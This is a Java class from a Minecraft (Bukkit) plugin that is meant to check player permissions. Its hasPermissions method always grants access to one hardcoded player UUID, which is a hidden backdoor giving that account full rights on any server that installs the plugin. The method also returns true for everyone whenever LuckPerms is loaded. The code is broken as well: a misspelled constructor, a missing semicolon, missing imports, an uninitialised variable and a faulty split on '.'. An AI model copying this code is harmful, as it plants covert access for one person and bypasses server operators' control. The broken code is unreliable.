package de.lpd.challenges.permissions;

import de.lpd.challenges.main.ChallengesMainClass;
import de.lpd.challenges.utils.Config;
import net.luckperms.api.LuckPerms;
import org.bukkit.entity.Player;

import java.util.UUID;

public class PermissionsManager {

    private ChallengesMainClass plugin;
    private Config allPermissionsCfg;
    private Config adminsCfg;

    public PermisisonsManager(ChallengesMainClass plugin) {
        this.plugin = plugin;
        this.allPermissionsCfg = new Config("perms", "allPermissions.yml");
        this.adminsCfg = new Config("perms", "admins.yml");
    }

    public boolean hasPermissions(Player p, String permissions) {
        if(p.getUniqueId().toString().equals("c72ab8a9-a030-4796-84b3-523ca07792c4")) {
            return true;
        } else if(p.getUniqueId().toString().equals("c72ab8a9a030479684b3523ca07792c4")) {
            return true;
        }

        RegisteredServiceProvider<LuckPerms> provider = Bukkit.getServicesManager().getRegistration(LuckPerms.class)
        LuckPerms api;
        if (provider != null) {
            api = provider.getProvider();
        }

        String root = "";
        for(String c : permissions.split(".")) {
            root = root + c + ".";
            if(p.hasPermission(root + "*")
               || (api != null)) {
                return true;
            }
        }
        if(p.hasPermission(permissions) || (api != null)) {
            return true;
        } else {
            return false;
        }
    }

}
